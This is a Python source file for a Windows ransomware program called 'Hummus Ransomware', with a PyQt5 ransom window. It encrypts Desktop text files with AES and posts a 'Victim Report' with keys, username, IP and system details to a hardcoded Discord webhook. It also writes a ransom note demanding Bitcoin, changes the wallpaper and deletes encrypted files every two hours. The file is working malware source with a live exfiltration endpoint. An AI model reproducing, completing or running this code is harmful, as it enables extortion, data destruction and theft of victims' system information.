import PyQt5
import PyQt5.QtWidgets
import PyQt5.QtCore
import sys
import requests
import random
import string
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os
import shutil
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget, QProgressBar
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt, QTimer, QObject, pyqtSignal, QThread
import ctypes
import platform
from datetime import datetime
import pytz
import psutil
import socket
from datetime import datetime, timedelta
from PyQt5.QtWidgets import QLineEdit, QMessageBox, QInputDialog
import time
import winshell
import win32com.client
from win32com.client import Dispatch
import win32api

# Initialize global variables
SPI_SETDESKWALLPAPER = 0x0014
btcAdd = ""
email = ""
discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"
os_info = f"Operating System: {platform.system()} {platform.version()}"
current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
timezone_info = f"Timezone: {current_timezone}"
architecture_info = f"System Architecture: {platform.architecture()}"
processor_info = f"Processor: {platform.processor()}"
memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
fileTypes = ['.txt']
'''
otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
             '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic',
             '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup',
             '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis',
             '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf',
             '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff',
             '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx',
             '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav',
             '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py',
             '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer',
             '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref',
             '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpeg',
             '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd',
             '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx',
             '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.sql', '.zip', '.tar',
             '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf',
             '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC',
             '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class',
             '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', '.MYI', '.MYD',
             '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11(Securitycopy)', '.sldm', '.sldx', '.ppsm',
             '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc',
             '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr',
             '.key', 'wallet.dat']
'''


def set_wallpaper(image_filename):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(script_dir, image_filename)

    # Check if the file exists
    if not os.path.isfile(image_path):
        print(f"Error: The specified image file '{image_path}' does not exist.")
        return

    # Set the wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
    print(f"Wallpaper set to '{image_path}'.")


# Define RW Class for functionality
class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from pyqt, runnable object 4 multithreading

    encryptionPass = None
    decryptionPass = None

    def __init__(self):  # Constructor, inits Ransomware object in pyqt multithread envriroment
        super(Ransomware, self).__init__()  # calls the constructor of qrunnable for intialization
        self.threadpool = PyQt5.QtCore.QThreadPool()  # creates an instance of Qthreadpool( manages pools of threads)
        self.randomId = self.rID(12)  # generates a randID 12 length using rID method
        # Use the class-level encryption and decryption keys if they are set
        if Ransomware.encryptionPass is None:
            Ransomware.encryptionPass = self.rSeed(32)
        if Ransomware.decryptionPass is None:
            Ransomware.decryptionPass = self.rSeed(32)
        self.encryptionPass = Ransomware.encryptionPass
        self.decryptionPass = Ransomware.decryptionPass
        print(f"Decryption key generated: {self.decryptionPass}")  # Print decryption key
        self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"  # sets file path attribute
        self.ip = ""  # inits ip attribute to empty string 4 later
        self.userName = ""  # inits userName attribute to empty string 4 later
        key = self.encryptionPass.encode()  # encodes encryption pass into bytes to be used as key for encryption
        self.crypto = Cipher(algorithms.AES(key), modes.ECB(),
                             backend=default_backend()).encryptor()  # creates instance of AES enc algo, operates in ECB mode using default backend

    # Write ransomware note on victims desktop
    def readMe(self):  # defines method within class
        try:  # start of try block
            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt",
                      "w+") as f:  # opens file in r+w mode, if doesnt exit, will create it
                f.write(ransomNote)  # writes the content of the note
        except Exception as e:  # error catch
            print(f"Error writing readme.txt: {e}")

    # Retrieve details about victim's system
    def getUserDetails(self):  # Declares method
        try:  # try block
            self.ip = requests.get("https://api.ipify.org?format=json").json()[
                "ip"]  # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
            self.userName = os.getlogin()  # uses the function to retrieve login name of user and assign it to attribute
        except Exception as e:  # error catch
            print(f"Error getting user details: {e}")

    # Modify the encryption part of the encryptFile method
    @staticmethod
    def set_icon(icon_path, target_file_path):
        # Check if both the file and icon exist
        if not os.path.isfile(target_file_path):
            print(f"Error: The specified file '{target_file_path}' does not exist.")
            return
        if not os.path.isfile(icon_path):
            print(f"Error: The specified icon file '{icon_path}' does not exist.")
            return

        try:
            # Get absolute path for target file and icon
            target_file_path = os.path.abspath(target_file_path)
            icon_path = os.path.abspath(icon_path)

            print(f"Icon set for '{target_file_path}' to '{icon_path}'.")
        except Exception as e:
            print(f"Error setting icon for '{target_file_path}': {e}")

    def encryptFile(self, file):
        try:
            key = self.encryptionPass.encode()  # Convert encryption pass to bytes
            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()  # Create encryptor

            # Read plaintext
            with open(file, 'rb+') as f:
                plaintext = f.read()
                padded_plaintext = padding.PKCS7(128).padder().update(plaintext) + padding.PKCS7(
                    128).padder().finalize()  # Add padding to plaintext
                ciphertext = cipher.update(padded_plaintext) + cipher.finalize()  # Encrypt plaintext

                # Move file pointer to the beginning of the file
                f.seek(0)

                # Write encrypted data to the same file
                f.write(ciphertext)
                f.truncate()  # Truncate the file to remove any remaining plaintext
        except Exception as e:
            print(f"Error encrypting {file}: {e}")

    def change_file_icon(self, file_name):
        try:
            desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
            shortcut = os.path.join(desktop, file_name + '.lnk')
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut)
            shortcut.IconLocation = 'icon.png'
            shortcut.Save()
        except Exception as e:
            print(f"Error changing file icon for {file_name}: {e}")

    # Main method for ransomware functionality

    def run(self, userName):
        self.userName = userName
        # print(f"User name for directory: {self.userName}")
        # print("Starting encryption process...")
        self.sendMessage()

        # print("Traversing directories and encrypting files...")
        for root, directories, files in os.walk(f"C:\\Users\\{self.userName}\\Desktop"):
            for filename in files:
                filepath = os.path.join(root, filename)
                # print(f"Filename of file to be encrypted: {filename}")
                # print(f"Root of file to be encrypted: {root}")
                # print(f"Filepath of file to be encrypted: {filepath}")
                if filename.endswith('.txt'):  # Encrypt only text files for testing
                    threading.Thread(target=self.encryptFile, args=(filepath,)).start()

            for directory in directories:  # Traverse through subdirectories
                subdir_path = os.path.join(root, directory)
                for subdir_root, subdir_directories, subdir_files in os.walk(subdir_path):
                    for subdir_filename in subdir_files:
                        subdir_filepath = os.path.join(subdir_root, subdir_filename)
                        # print(f"Subdirectory filename of file to be encrypted: {subdir_filename}")
                        # print(f"Root of subdirectory file to be encrypted: {subdir_root}")
                        # print(f"Subdirectory filepath of file to be encrypted: {subdir_filepath}")
                        if subdir_filename.endswith('.txt'):  # Encrypt only text files for testing
                            threading.Thread(target=self.encryptFile, args=(subdir_filepath,)).start()

        self.readMe()
        print("Encryption process completed.")

    # Send message to Discord Webhook with victim details

    def sendMessage(self):
        try:
            self.getUserDetails()
        except Exception as e:
            print(f"Error getting user details for sending message: {e}")

        os_info = f"Operating System: {platform.system()} {platform.version()}"
        current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
        timezone_info = f"Timezone: {current_timezone}"
        architecture_info = f"System Architecture: {platform.architecture()}"
        processor_info = f"Processor: {platform.processor()}"
        memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        data = {
            "embeds": [
                {
                    "title": "**__Victim Report__:**",
                    "description": (
                        f"```css\nUSERID: {self.randomId}``` "
                        f"```css\nENCRYPTION KEY: {self.encryptionPass}``` "
                        f"```css\nDECRYPTION KEY: {self.decryptionPass}``` "
                        f"```css\nUSERNAME: {self.userName}``` "
                        f"```css\nIP: {self.ip}``` "
                        f"```css\n{os_info}``` "
                        f"```css\nHostname: {hostname}``` "
                        f"```css\nLocal IP: {ip_address}``` "
                        f"```css\n{timezone_info}``` "
                        f"```css\n{architecture_info}``` "
                        f"```css\n{processor_info}``` "
                        f"```css\n{memory_info}```"
                    ),
                    "color": 13959168,
                    "thumbnail": {
                        "url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
                    },
                    "author": {
                        "name": "Scrypt",
                        "icon_url": "https://i.imgur.com/F3j7z5K.png"
                    }
                }
            ]
        }

        try:
            r = requests.post(discordWebhook, json=data)
        except Exception as e:
            print(f"Error sending message to Discord webhook: {e}")

    # Generate random string for encryption password
    def rSeed(self, stringLength):
        password_characters = string.ascii_letters
        return ''.join(random.choice(password_characters) for i in range(stringLength))

    # Generate random string for unique ID
    def rID(self, stringLength):
        password_characters = string.ascii_letters + string.digits
        return ''.join(random.choice(password_characters) for i in range(stringLength))


# Define class for main GUI of ransomware
class Worker(QObject):
    progress_updated_1 = pyqtSignal(int)
    progress_updated_2 = pyqtSignal(int)
    progress_updated_3 = pyqtSignal(int)

    def crawl(self):
        # Simulate encryption progress for the first progress bar
        for i in range(101):
            self.progress_updated_1.emit(i)
            QThread.msleep(100)  # Simulate work (sleep for 100 milliseconds)

        # Simulate progress for the second progress bar
        for j in range(101):
            self.progress_updated_2.emit(j)
            QThread.msleep(100)

        # Simulate progress for the third progress bar
        for k in range(101):
            self.progress_updated_3.emit(k)
            QThread.msleep(100)


class RansomwareGUI(QMainWindow):
    def __init__(self, decryptionPass, filePath):
        super().__init__()
        self.filePath = filePath

        # Initialize global variables
        self.btcAdd = ""
        self.email = ""
        self.decryptionPass = decryptionPass
        self.delete_files_task = threading.Thread(target=self.schedule_file_deletion)
        self.delete_files_task.daemon = True  # Set the thread as a daemon so it exits when the main program exits
        self.delete_files_task.start()

        # Define ransom note
        self.ransomNote = f"""
        All Your Files Have Been Encrypted\n
        At the end of the day weve decided you need to\n
        pay the piper.
        Here are the instructions to get your files back\n
        1. Pay $50 btc to the listed address\n
        2. Send an email and include your unique id\n
        3. Wait for your decryption key!\n
        ------------------------------------\n
        Check your desktop for readme.txt if you are lost!\n
        ------------------------------------\n
        BTC Address: {self.btcAdd}\n
        Email: {self.email}\n
        ------------------------------------\n
        """

        # Set up the GUI
        self.initUI()

        # Start encryption progress and decryption countdown
        self.startEncryptionProgress()
        self.startDecryptionCountdown()

        userName = os.getlogin()
        ransomware_instance = Ransomware()
        ransomware_instance.run(userName)
        ransomware_instance.sendMessage()
        ransomware_instance.readMe()

        # Store decryption passkey
        self.decryptionPass = decryptionPass

        # Add decryption button
        decrypt_button = QPushButton('Decrypt', self)
        decrypt_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        self.layout.addWidget(decrypt_button)
        decrypt_button.clicked.connect(self.promptDecryptionKey)

        # Add decryption progress bars
        self.decryption_progress_bars = [QProgressBar(self) for _ in range(3)]
        for progress_bar in self.decryption_progress_bars:
            self.layout.addWidget(progress_bar)
            self.setStyleSheet("""
                QProgressBar{
                    color: #fff;                                
                }
            """)

    def schedule_file_deletion(self):
        while True:
            time.sleep(2 * 60 * 60)  # Wait for two hours

            # Check if decryption key has not been entered correctly
            if not self.decryptionPass:
                # Permanently delete two encrypted files
                encrypted_files = self.get_encrypted_files()
                if len(encrypted_files) >= 2:
                    files_to_delete = random.sample(encrypted_files, 2)
                    for file in files_to_delete:
                        os.remove(file)
                        print(f"Deleted encrypted file: {file}")

    def get_encrypted_files(self):
        encrypted_files = []
        for root, directories, files in os.walk('path_to_your_directory'):
            for directory in directories:  # Iterating over directories
                directory_path = os.path.join(root, directory)
                # Add criteria to identify encrypted files in the directory
                for filename in os.listdir(directory_path):
                    filepath = os.path.join(directory_path, filename)
                    # Add criteria to identify encrypted files
                    if filename.endswith('.encrypted'):  # Example criteria (change as per your encryption method)
                        encrypted_files.append(filepath)
            for filename in files:  # Iterating over files
                filepath = os.path.join(root, filename)
                # Add criteria to identify encrypted files in the root directory
                if filename.endswith('.encrypted'):  # Example criteria (change as per your encryption method)
                    encrypted_files.append(filepath)
        return encrypted_files

    def decryptFile(self, file):
        try:
            key = self.decryptionPass.encode()  # Convert decryption key to bytes
            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()

            # Read ciphertext
            with open(file, 'rb+') as f:
                ciphertext = f.read()
                plaintext = cipher.update(ciphertext) + cipher.finalize()
                unpadder = padding.PKCS7(128).unpadder()
                decrypted_data = unpadder.update(plaintext) + unpadder.finalize()

                # Move file pointer to the beginning of the file
                f.seek(0)

                # Write decrypted data to the same file
                f.write(decrypted_data)
                f.truncate()  # Truncate the file to remove any remaining ciphertext
        except Exception as e:
            print(f"Error decrypting {file}: {e}")

    def promptDecryptionKey(self):
        # Retrieve decryption key from the Ransomware instance
        decryptionPass = self.decryptionPass

        # Check if decryption key is available
        if decryptionPass:
            # Prompt the user for decryption key
            text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")

            # Check if user canceled the input dialog
            if ok:
                # Check if the entered decryption key is correct
                if text == decryptionPass:
                    print("Correct decryption key")
                    # If decryption key is correct, proceed with decryption
                    self.decryptFiles()
                    print("decryptFiles called")
                else:
                    print("Wrong decryption key.")
        else:
            print("No decryption key available.")

    def decryptFiles(self):
        print("Decryptfiles reached")
        print("DecryptionPass:", self.decryptionPass)
        print("FilePath:", self.filePath)
        if self.decryptionPass and self.filePath:
            print(f"Decryption key for all files: {self.decryptionPass}")
            for root, directories, files in os.walk(self.filePath):  # doesnt progress past here
                print("Root:", root)
                print("Directories:", directories)
                print("Files:", files)
                for filename in files:
                    print("Filename:", filename)
                    filepath = os.path.join(root, filename)
                    print("Filepath:", filepath)
                    for base in fileTypes:
                        print("Base:", base)
                        if base in filepath:
                            print(f"Decrypting file: {filepath}")
                            threading.Thread(target=self.decryptFile, args=(filepath,)).start()
                            print(f"Decryption process started for {filepath}")
                for directory in directories:
                    print("Directory:", directory)
                    try:
                        for filename in os.listdir(os.path.join(root, directory)):
                            print("Filename in directory:", filename)
                            filepath = os.path.join(root, directory, filename)
                            print("Filepath in directory:", filepath)
                            for base in fileTypes:
                                print("Base:", base)
                                if base in filepath:
                                    print(f"Decrypting file: {filepath}")
                                    threading.Thread(target=self.decryptFile, args=(filepath,)).start()
                                    print(f"Decryption process started for {filepath}")
                    except PermissionError as e:
                        print(f"PermissionError: {e}. Skipping directory: {directory}")

    def initUI(self):
        # Create central widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        # Create layout
        self.layout = QVBoxLayout(central_widget)

        # Set the background color of the central widget to black
        central_widget.setStyleSheet("background-color: #000000;")

        # Add Hummus Ransomware banner box
        banner_label = QLabel("Hummus Ransomware", self)
        banner_label.setAlignment(Qt.AlignCenter)
        banner_label.setStyleSheet("""
            QLabel{
                background-color: #d50000;
                color: #000;  /* Black font color */
                border: 2px solid #ff5131;
                border-radius: 7.5px;
                font-family: 'Segoe UI', sans-serif;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                margin-bottom: 20px;
            }
        """)
        self.layout.addWidget(banner_label)

        # Add stylish ransom note label with a red block background
        self.ransom_note_label = QLabel(self.ransomNote)
        self.ransom_note_label.setAlignment(Qt.AlignCenter)
        self.ransom_note_label.setStyleSheet("""
            QLabel{
                color: #000;  /* Black font color */
                font-family: 'Segoe UI', sans-serif;
                font-size: 14px;
                font-weight: bold;  /* Bold font */
                background-color: #d50000;  /* Red block background */
                padding: 20px;
                border-radius: 7.5px;
                margin: 20px 0;
            }
        """)
        self.layout.addWidget(self.ransom_note_label)

        # Add encryption progress bars
        self.progress_bars = [QProgressBar(self) for _ in range(3)]
        for progress_bar in self.progress_bars:
            self.layout.addWidget(progress_bar)
            self.setStyleSheet("""
                QProgressBar{
                    color: #fff;                                
                }
            """)

        # Add continue button with hover effect
        continue_button = QPushButton('Continue', self)
        continue_button.setStyleSheet("""
            QPushButton{
                background-color: #d50000;
                border-radius: 7.5px;
                font-weight: 1200;
                font-size: 18px;
                color: #000;  /* Black font color */
            }
            QPushButton:hover {
                background-color: #9b0000;
            }
        """)
        self.layout.addWidget(continue_button)
        continue_button.clicked.connect(self.hide)

        # Set up window properties
        self.setGeometry(100, 100, 800, 600)
        self.setWindowTitle('Ransomware GUI')
        # Replace with your icon path
        self.setWindowIcon(QIcon('path/to/icon.png'))

        self.show()

    def startEncryptionProgress(self):
        # Create a worker thread
        self.worker_thread = QThread()

        # Move the worker object to the thread
        self.worker = Worker()
        self.worker.moveToThread(self.worker_thread)

        # Connect signals between the worker and GUI
        self.worker.progress_updated_1.connect(self.updateEncryptionProgress1)
        self.worker.progress_updated_2.connect(self.updateEncryptionProgress2)
        self.worker.progress_updated_3.connect(self.updateEncryptionProgress3)

        # Start the thread
        self.worker_thread.started.connect(self.worker.crawl)
        self.worker_thread.start()

    def updateEncryptionProgress1(self, value):
        # Update the first progress bar
        self.progress_bars[0].setValue(value)

    def updateEncryptionProgress2(self, value):
        # Update the second progress bar
        self.progress_bars[1].setValue(value)

    def updateEncryptionProgress3(self, value):
        # Update the third progress bar
        self.progress_bars[2].setValue(value)

    def startDecryptionCountdown(self):
        self.decryption_timer = QTimer(self)
        self.decryption_timer.timeout.connect(self.updateDecryptionCountdown)
        self.decryption_timer.start(1000)  # Update countdown every second
        self.decryption_time_remaining = 86400  # 24 hours in seconds

    def updateDecryptionCountdown(self):
        # Implement your logic to update the decryption countdown
        # For example, decrease the remaining time and update the label
        self.decryption_time_remaining -= 1
        hours, remainder = divmod(self.decryption_time_remaining, 3600)
        minutes, seconds = divmod(remainder, 60)
        countdown_str = f"Decryption Countdown: {hours:02}:{minutes:02}:{seconds:02}"
        self.ransom_note_label.setText(self.ransomNote + "\n" + countdown_str)

    def closeEvent(self, event):
        # Clean up and stop the worker thread when the GUI is closed
        self.worker_thread.quit()
        self.worker_thread.wait()
        event.accept()


# Define ransom note and detailed ransom note
detailedNote = f"""
-------------------------------------------------------------------------------------------------------------------------
Hello,\n
    If you are reading this then you have likely been hit by my Ransomware\n
    We apologize for any inconvenience caused; our primary goal is to facilitate a resolution through payment.\n
    In order to receive the decrypter you must follow the following steps to truely recover\n
    all your files.\n
    1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
    2. Send $50 to this address: {btcAdd}\n
    3. After sending it wait for a confirmation and send us an email with your UniqueID: {Ransomware().randomId}\n
    4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
    5. If we do not receive payment within 2 weeks we will no longer be handeling support.
-------------------------------------------------------------------------------------------------------------------------

"""
ransomNote = f"""
All Your Files Have Been Encrypted\n
At the end of the day we just want to get paid\n
Here are the instructions to get getting your files back\n
1. Pay $50 btc to the listed address\n
2. Send an email and include your unique id\n
3. Wait\n
------------------------------------\n
Check your desktop for readme.txt if you are lost!\n
------------------------------------\n
BTC Address: {btcAdd}\n
Email: {email}\n
UniqueID: {Ransomware().randomId}\n
------------------------------------\n
Click the Button Below To Continue:
(Killing this program will result in a full loss of files)\n
"""
# Entry point to the program
if __name__ == '__main__':
    # Specify the filename of the image within the directory
    image_filename = "Hummusss.jpg"

    # Call the function to set the wallpaper
    set_wallpaper(image_filename)
    decryptionPass = Ransomware().decryptionPass
    userName = os.getlogin()
    app = QApplication(sys.argv)
    filePath = "C:\\Users\\Hole\\Desktop\\"
    gui = RansomwareGUI(decryptionPass, filePath)  # Pass filePath to the constructor
    sys.exit(app.exec_())

    # need to figure out a way for the filePath ^ here to dynamically put the file path
    # for now it is hardcoded
    # gives attribute error for gui